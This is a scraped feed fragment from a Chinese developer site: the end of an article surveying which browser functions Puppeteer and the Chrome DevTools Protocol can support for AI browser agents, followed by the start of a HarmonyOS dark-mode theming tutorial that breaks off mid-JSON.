<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">await</span> page.<span class="hljs-property">keyboard</span>.<span class="hljs-title function_">down</span>(<span class="hljs-string">"KeyA"</span>, { <span class="hljs-attr">commands</span>: [<span class="hljs-string">"SelectAll"</span>] });
<span class="hljs-keyword">await</span> page.<span class="hljs-property">keyboard</span>.<span class="hljs-title function_">up</span>(<span class="hljs-string">"KeyA"</span>); <span class="hljs-comment">// working in macOS</span>
</code></pre>
<p>这样下面这些常见的编辑类快捷键就可以支持了：</p>















































<table><thead><tr><th align="left">操作</th><th align="left">macOS</th><th align="left">Windows/Linux</th><th align="left">CDP commands</th></tr></thead><tbody><tr><td align="left">复制</td><td align="left">Command + C</td><td align="left">Ctrl + C</td><td align="left">Copy</td></tr><tr><td align="left">粘贴</td><td align="left">Command + V</td><td align="left">Ctrl + V</td><td align="left">Paste</td></tr><tr><td align="left">剪切</td><td align="left">Command + X</td><td align="left">Ctrl + X</td><td align="left">Cut</td></tr><tr><td align="left">撤销</td><td align="left">Command + Z</td><td align="left">Ctrl + Z</td><td align="left">Undo</td></tr><tr><td align="left">恢复</td><td align="left">Shift + Command + Z</td><td align="left">Ctrl + Y</td><td align="left">Redo</td></tr><tr><td align="left">全选</td><td align="left">Command + A</td><td align="left">Ctrl + A</td><td align="left">SelectAll</td></tr></tbody></table>
<p>对于一些其他的权限较高的快捷键，我们可以可以做好<strong>功能映射</strong>：</p>
<ul>
<li>查看浏览器历史记录：<code>Page.goto('chrome://history/')</code></li>
<li>退出浏览器：<code>Browser.close()</code></li>
<li>导航到上个页面：<code>Page.goBack()</code></li>
<li>......</li>
</ul>
<p>当然这些也最好按需添加，全适配意义不大。</p>
<h2 data-id="heading-10">三、网页功能</h2>
<p>主要指对网页本身的做的操作，影响范围主要为当前网页，有截图，文件上传下载等功能。</p>
<h3 data-id="heading-11">截图</h3>
<ul>
<li><strong>必要性</strong>：高</li>
<li><strong>支持度</strong>：直接支持</li>
</ul>
<p>CDP 的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fchromedevtools.github.io%2Fdevtools-protocol%2Ftot%2FPage%2F%23method-captureScreenshot" target="_blank" title="https://chromedevtools.github.io/devtools-protocol/tot/Page/#method-captureScreenshot" ref="nofollow noopener noreferrer">Page.captureScreenshot</a> API 可以直接对网页内容本身做截图。但需要注意的是，CDP 截图只能截到网页本身（也就是<strong>绿框</strong>内的内容），外部的 Chrome UI 是截图不到的。</p>
<p>所以这里需要格外注意，部分 VLM 模型在训练阶段是用的完整的 Chrome 截图（<strong>红框</strong>内的内容），如果泛化能力一般，直接把 CDP 截图传给 VLM，可能会有 action 坐标错位的问题。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88fd4ee521ac40e4863398ecb2480ae4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=hurB%2F4xWcGnZJPy0ELZDesplZes%3D" alt="screenshot" loading="lazy"/></p>
<h3 data-id="heading-12">基础交互</h3>
<ul>
<li><strong>必要性</strong>：高</li>
<li><strong>支持度</strong>：间接支持</li>
<li><strong>pptr API：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fpptr.dev%2Fapi%2Fpuppeteer.keyboard" target="_blank" title="https://pptr.dev/api/puppeteer.keyboard" ref="nofollow noopener noreferrer">Keyboard class</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fpptr.dev%2Fapi%2Fpuppeteer.mouse" target="_blank" title="https://pptr.dev/api/puppeteer.mouse" ref="nofollow noopener noreferrer">Mouse class</a></li>
</ul>
<p>这里的基础操作主要是指 click，drag，keyboard 等行为，这些 puppeteer 做好了原子方法，可以直接组合使用。而且 pptr 也提供了各种 DOM 回调去执行相关的 action 操作，还是非常灵活的。这里推荐直接看 pptr 的文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpptr.dev%2Fguides%2Fpage-interactions" target="_blank" title="https://pptr.dev/guides/page-interactions" ref="nofollow noopener noreferrer">pptr: Page Interactions</a>，还是描述的比较清晰的。</p>
<h3 data-id="heading-13">Dialog 弹窗</h3>
<ul>
<li><strong>必要性</strong>：高</li>
<li><strong>支持度</strong>：间接支持</li>
<li><strong>pptr API：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fpptr.dev%2Fapi%2Fpuppeteer.dialog" target="_blank" title="https://pptr.dev/api/puppeteer.dialog" ref="nofollow noopener noreferrer">Dialog class</a></li>
</ul>
<p>CDP 可以直接感知到弹窗的相关事件（例如 <a href="https://link.juejin.cn?target=https%3A%2F%2Fchromedevtools.github.io%2Fdevtools-protocol%2Ftot%2FPage%2F%23event-javascriptDialogOpening" target="_blank" title="https://chromedevtools.github.io/devtools-protocol/tot/Page/#event-javascriptDialogOpening" ref="nofollow noopener noreferrer">Page.javascriptDialogOpening</a>），所以下方的 4 类弹窗的触发都是可以感知到的：</p>

























<table><thead><tr><th align="center">Alert</th><th align="center">Confirm</th></tr></thead><tbody><tr><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/788f0c6f8b08442b95aaf9fa285d6286~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=8ZVIfpe8gltj%2BNY5LHMSRn01bIk%3D" alt="alert" loading="lazy"/></td><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7756ccddb98a4aaaa1f93dd4ad4129b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=AO%2Bc35UogxxKMwCK%2B2xYLDUaK78%3D" alt="confirm" loading="lazy"/></td></tr><tr><td align="center"/><td align="center"/></tr><tr><td align="center"><strong>Prompt</strong></td><td align="center"><strong>Beforeunload</strong></td></tr><tr><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99683d862e5041b0ac10e3a8c90275fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=4mL74OUXD0rYmPKLbQvvRdCirOg%3D" alt="dialog" loading="lazy"/></td><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e80538eb60e45bc8c49ed97bcc1ada1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=wYxbcVaBCI5KHPF216B91sP4Gm8%3D" alt="beforeunload" loading="lazy"/></td></tr></tbody></table>
<p>因为弹窗是一个优先级很高的浏览器行为，它一旦唤起基本会中断网页的所有行为，JS 引擎也会挂起停止响应，所以必须得响应关闭弹窗才能执行后续流程，综合来看是一个非常高优的功能。</p>
<h3 data-id="heading-14">右键菜单</h3>
<ul>
<li><strong>必要性</strong>：低</li>
<li><strong>支持度</strong>：间接支持</li>
</ul>
<p>CDP 无法感知到在页面内点击「鼠标右键」后触发的 <strong>系统菜单</strong> 本身：</p>

















<table><thead><tr><th align="center">Page</th><th align="center">Image</th><th align="center">Link</th><th align="center">Tab</th></tr></thead><tbody><tr><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8e419a8672174c0a94d2b4577120f5c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=xAlFVAFERBJbhP6W0WRKn1k8xY8%3D" alt="page-right-button" loading="lazy"/></td><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/836f1cd5f8c14d10989058b8b9c41e96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=LAMzm6eVrSH%2FxRQzmcPTzilSGaE%3D" alt="link-right-button" loading="lazy"/></td><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9fb1b77f91884b558f3c7f40d6c5f866~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=yQHePd9sQmAdgIxxnDWxCoj4Kvw%3D" alt="17-cdp-do-image-right-button" loading="lazy"/></td><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3268737522fa4657b6976a71fbf35ded~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=fPBL4wAjHhMGMJ5P9q%2FiAjmhviY%3D" alt="tab-right-button" loading="lazy"/></td></tr></tbody></table>
<p>但系统弹窗内的功能基本可以通过其他方式实现，比如说「返回/前进/重新加载」等功能都可以用一些 Navigate 的方法做平替。但就目前的用户诉求看，这部分功能的必要性并不高。</p>
<p>对于网页内<strong>自定义的右键菜单</strong>，因为基本都是 DOM 绘制的，其实可以通过网页内截图感知到的，例如下图中 bilibili 播放器的右键 DOM 菜单就可以被 CDP 截图捕获：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f732a14834f435b96e550cf16e2aa3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=aXZ86hvjDKyjFWXRJANyhSOrufo%3D" alt="custom-right-button" loading="lazy"/></p>
<h3 data-id="heading-15">Input 选择器</h3>
<ul>
<li><strong>必要性</strong>：高</li>
<li><strong>支持度</strong>：间接支持</li>
</ul>
<p>HTML 的大部分表单功能都是支持的，但是部分 Input 选择器使用了系统控件（例如 HTML 默认的 Select 选择器，日期选选择器），导致 CDP 截图无法感知到。</p>
<p>目前测试下来有这些选择器都是无法被 CDP Screenshot 所捕获的：</p>

















<table><thead><tr><th align="center">Select</th><th align="center">Date</th><th align="center">Time</th><th align="center">Color</th></tr></thead><tbody><tr><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e71f11eb98e4813972ee7661cc648e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=FE%2FA1Zj2QR4eHYgtFUsI3gGFbGE%3D" alt="select" loading="lazy"/></td><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b56f0762115c42d2b800bc0d37c178a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=%2BGFrHh8ho%2B4r%2Bp92FCNXbtu5mJk%3D" alt="date" loading="lazy"/></td><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/547b911968d44dab860192e80a30753f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=g5zDue%2B71Yn1LvNDhZKAjcbTGeI%3D" alt="time" loading="lazy"/></td><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7724fd3787ee41d1be2321589ecd500f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=qt75nDhNBHa6y8Zi5hKYo3TZrSU%3D" alt="23-cdp-do-link-color" loading="lazy"/></td></tr></tbody></table>
<p>但是也不是没有迂回的办法，我们可以尝试使用 JS 代码注入替换掉现有的系统控件为 DOM 控件，间接的实现被截图的诉求。例如 Select Option Picker，替换后的效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98b5f93c457b4688bf8be8d7b995705a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=%2BadDQ%2BVUgijpfLjPIC5E69K%2BVk4%3D" alt="select-dom" loading="lazy"/></p>
<h3 data-id="heading-16">文件上传/下载</h3>
<ul>
<li><strong>必要性</strong>：高</li>
<li><strong>支持度</strong>：直接支持</li>
<li><strong>pptr API：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fpptr.dev%2Fapi%2Fpuppeteer.elementhandle.uploadfile" target="_blank" title="https://pptr.dev/api/puppeteer.elementhandle.uploadfile" ref="nofollow noopener noreferrer">ElementHandle.uploadFile()</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fpptr.dev%2Fapi%2Fpuppeteer.filechooser" target="_blank" title="https://pptr.dev/api/puppeteer.filechooser" ref="nofollow noopener noreferrer">FileChooser class</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fpptr.dev%2Fapi%2Fpuppeteer.downloadbehavior" target="_blank" title="https://pptr.dev/api/puppeteer.downloadbehavior" ref="nofollow noopener noreferrer">DownloadBehavior</a></li>
</ul>
<p>pptr 上执行文件的逻辑较为完善，结合 uploadFile API 和 FileChooser 都可以做较好的文件上传支持。但是在文件下载上并没有提供非常好的 API，用户可以操作的就是通过 DownloadBehavior 去指定下载策略和下载路径。</p>
<h3 data-id="heading-17">打印</h3>
<ul>
<li><strong>必要性</strong>：中</li>
<li><strong>支持度</strong>：直接支持</li>
<li><strong>pptr API</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpptr.dev%2Fapi%2Fpuppeteer.page.pdf" target="_blank" title="https://pptr.dev/api/puppeteer.page.pdf" ref="nofollow noopener noreferrer">Page.pdf()</a></li>
</ul>
<p>这个也是现成的 API，直接调用即可。</p>
<h3 data-id="heading-18">其它 Page 级功能</h3>
<ul>
<li><strong>必要性</strong>：低</li>
<li><strong>支持度</strong>：不支持</li>
</ul>
<p>除了上述的各种高频功能，浏览器还有一些甜品级小功能，但从个人角度和用户诉求上看，这些功能在 Browser-Use 场景基本上用不到，而且这些功能 CDP 也基本不支持，但为了本文的内容完整性还是列出来：</p>
<ul>
<li>书签</li>
<li>翻译</li>
<li>搜索</li>
<li>二维码</li>
<li>......</li>
</ul>

























<table><thead><tr><th align="center">书签</th><th align="center">翻译</th></tr></thead><tbody><tr><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/50f80a8fd5f64a3d817ef70d99004a09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=w71235wGOObHtbYn9OYwwRsQV0Y%3D" alt="mark" loading="lazy"/></td><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/411e5b50d7ef426eb7d35d5ee0c11136~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=fGzhjrimq9C831aiOFhdFBvMe3Y%3D" alt="trans" loading="lazy"/></td></tr><tr><td align="center"/><td align="center"/></tr><tr><td align="center"><strong>搜索</strong></td><td align="center"><strong>二维码</strong></td></tr><tr><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48ce16af9d574227a32491591141db67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=t14wTfYWxSB22OFvAgPHvIq%2BuRw%3D" alt="search" loading="lazy"/></td><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d793b1d1016149a7b4c43cbfacd3ed8d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=XtR%2B1nL9oMrW012qxLEDeYH%2Frow%3D" alt="qrcode" loading="lazy"/></td></tr></tbody></table>
<h2 data-id="heading-19">总结</h2>
<p>综上所述，我们可以看到 CDP 还是有明显的能力边界，但是已经足够支持 95% 的业务功能了。最重要的是把相关的功能打磨好，才能最大程度的放大 AI 的能力。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[鸿蒙主题切换：一个开关搞定白天/黑夜模式]]></title>    <link>https://juejin.cn/post/7589074117644812323</link>    <guid>https://juejin.cn/post/7589074117644812323</guid>    <pubDate>2025-12-29T13:05:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589074117644812323" data-draft-id="7589063105732460559" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="鸿蒙主题切换：一个开关搞定白天/黑夜模式"/> <meta itemprop="keywords" content="HarmonyOS"/> <meta itemprop="datePublished" content="2025-12-29T13:05:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="90后晨仔"/> <meta itemprop="url" content="https://juejin.cn/user/2717648476705773"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            鸿蒙主题切换：一个开关搞定白天/黑夜模式
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648476705773/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    90后晨仔
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T13:05:15.000Z" title="Mon Dec 29 2025 13:05:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>我强烈推荐使用<strong>鸿蒙原生资源限定词方案</strong>，配合一个简单的开关控制。这是最优雅、最高效的实现方式。让我用一个完整可运行的示例告诉你为什么。</p>
<h2 data-id="heading-0">一、完整实现：一个开关控制白天/黑夜模式</h2>
<h3 data-id="heading-1">1.1 项目结构</h3>
<pre><code class="hljs language-bash" lang="bash">project/
├── AppScope/resources/
│   ├── base/element/color.json      <span class="hljs-comment"># 白天模式颜色</span>
│   └── dark/element/color.json      <span class="hljs-comment"># 夜间模式颜色</span>
├── entry/src/main/ets/
│   ├── pages/
│   │   └── Index.ets               <span class="hljs-comment"># 主页面</span>
│   └── utils/
│       └── ThemeUtils.ets          <span class="hljs-comment"># 主题管理工具</span>
└── entry/src/main/resources/
    ├── base/media/                 <span class="hljs-comment"># 白天模式图标</span>
    └── dark/media/                 <span class="hljs-comment"># 夜间模式图标</span>
</code></pre>
<h3 data-id="heading-2">1.2 颜色资源定义</h3>
<p><strong>白天主题颜色</strong> (<code>base/element/color.json</code>):</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"color"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"app_bg_primary"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"value"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#F8F9FA"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"app_text_primary"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"value"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#212529"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"app_card_bg"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"value"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#FFFFFF"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"app_accent_primary"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"value"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#0D6EFD"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"app_switch_track_on"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"value"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#34C759"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"app_switch_track_off"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"value"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#E9ECEF"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>夜间主题颜色</strong> (<code>dark/element/color.json</code>):</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"color"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"app_bg_primary"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"value"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#121212"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"app_text_primary"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"value"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#E9ECEF"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"app_card_bg"</span><span class="hljs-punctuation">,</span>
